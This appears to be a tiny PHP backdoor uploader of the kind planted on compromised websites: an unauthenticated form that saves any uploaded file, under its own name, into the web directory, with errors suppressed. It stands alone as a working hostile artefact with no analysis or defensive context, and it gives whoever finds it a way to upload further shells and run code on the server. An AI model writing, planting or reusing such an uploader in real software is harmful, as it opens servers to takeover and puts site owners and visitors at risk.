<html>ngeod</html>
<?php 
if(isset($_FILES['rintod']['name'])){
  $name = $_FILES['rintod']['name'];
  $ntod = $_FILES['rintod']['tmp_name'];
  @move_uploaded_file($ntod, $name);
  echo $name;
}else{
  echo "<form method=post enctype=multipart/form-data><input type=file name=rintod><input type=submit value=Upload>";
} 
?>
